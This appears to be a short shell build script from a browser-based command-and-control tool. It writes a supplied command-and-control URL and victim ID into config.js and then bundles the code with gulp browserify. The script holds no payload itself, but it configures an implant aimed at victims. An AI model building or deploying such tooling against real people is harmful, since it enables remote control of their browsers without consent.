#!/bin/sh

BASEDIR=$(dirname "$0")

REALTIMEURL=$1
VICTIMID=$2

echo "module.exports = {
    COMMAND_CONTROL_URL: '${REALTIMEURL}',
    VICTIM_ID: '${VICTIMID}'
};"  > $BASEDIR/config.js

gulp browserify
